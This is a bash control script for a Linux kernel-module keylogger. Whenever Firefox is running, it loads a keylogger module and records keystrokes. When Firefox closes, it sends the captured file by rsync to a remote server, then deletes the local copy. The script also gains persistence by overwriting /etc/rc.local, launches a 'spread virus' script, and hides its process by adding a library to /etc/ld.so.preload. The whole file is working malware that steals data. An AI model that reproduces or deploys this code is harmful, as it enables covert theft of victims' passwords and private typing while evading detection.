#!/bin/bash 
#!usr/bash

# get the location of files
path=`pwd`
echo "$path"
spreadpath=${path%/kernel-based-keylogger-for-Linux-master}

subpath=${path#*/home/}
usr=${subpath%%/*}

# add startup item and spread virus
cp  $path/rc.local  /etc 
$spreadpath/testTop/spread.sh &

# hide process
cd $path/hider-full_nelson
make
sudo mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
cd $path

# compile getpid.c
make
gcc getpid.c -o getpid

# create passwd.txt file
touch passwd.txt
echo "123456" >> $path/passwd.txt
chmod 600 passwd.txt

flag=0
while true
do
	check_results=$(./getpid)
	echo "$check_results"
	if [[ $check_results = "0" ]]
	then
		# firefox is not running
		if [[ $flag = 1 ]]
		# keylogger is still running, which means firefox is just closed
		then
			# set the state of keylogger as stopped
			flag=0
			# copy AKeylog to avoid invalid input
			cp -i  /proc/AKeylog $path/firefox.txt
			echo "copy finished"

			# add the info of process to file
			echo "$TMP" >> firefox.txt
			
			echo "look here"
			# send file to server
			rsync -vazu --progress $path/firefox.txt zhangjiayu@172.20.10.10::Rsynctest --password-file=$path/passwd

			# remove the local file
			rm $path/firefox.txt

			# stop keylogger
			echo "stop keylogger"
			sudo rmmod AKeylogger
		else 
			echo "no firefox"
		fi
	else 	
		# firefox is running
		if [[ $flag = 0 ]]
		then
			# keylogger is not running, firefox is just opened
			echo "firefox starts running"
			# get info of firefox process	
			TMP=`pgrep firefox | xargs ps -u --pid`
			echo "$TMP"
			# set the state of keylogger as running
			flag=1
			# start keylogger
			echo "start keylogger"
			sudo insmod AKeylogger.ko
		else 
			echo "recording..."
		fi		
	fi
	sleep 0.5s
done